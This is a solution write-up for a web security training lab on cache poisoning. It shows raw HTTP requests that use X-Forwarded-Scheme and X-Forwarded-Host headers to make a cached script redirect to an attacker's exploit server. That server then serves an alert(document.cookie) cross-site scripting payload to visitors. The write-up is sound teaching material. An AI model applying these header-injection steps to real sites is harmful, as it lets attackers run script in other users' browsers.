## Web cache poisoning with multiple headers

This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

Hint :

This lab supports both the X-Forwarded-Host and X-Forwarded-Scheme headers.

## Notes

- Exploit server
- /login
- X-Cache Header
- Cache-Control Header
- /resources/js/tracking.js

## Resume

1. Find cached request
2. Exploit the XSS with custom header
3. Store payload on exploit server
4. Deliver exploit to victim

## Solve

The first step is to find a cached request, in this lab the `/resources/js/tracking.js` has a cached HTTPS response : 

```http
GET /resources/js/tracking.js HTTP/2
Host: 0abb0086041fbbd680f1087c00170021.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 11
X-Cache: hit
Content-Length: 11119
```

If we now add the `X-Forwarded-Host` and `X-Forward-Scheme` (using a diffrent protocol then HTTPS) headers and resend a request, we can see that we are getting redirect on our exploit server : 

```http
GET /resources/js/tracking.js HTTP/2
Host: 0abb0086041fbbd680f1087c00170021.web-security-academy.net
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a0c007704efbbb3800607d301d40024.exploit-server.net
```

```http
HTTP/2 302 Found
Location: https://exploit-0a0c007704efbbb3800607d301d40024.exploit-server.net/resources/js/tracking.js
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 1
X-Cache: hit
Content-Length: 0
```

We can now go to the exploit server store our payload  : 

```js
alert(document.cookie)
```

Once it's stored, we can send multiple home page request including our `X-Forwarded-Host` who point on our exploit server and `X-Forward-Scheme` with the value : **http** and wait for the visitor to access the home page and triger the XSS. 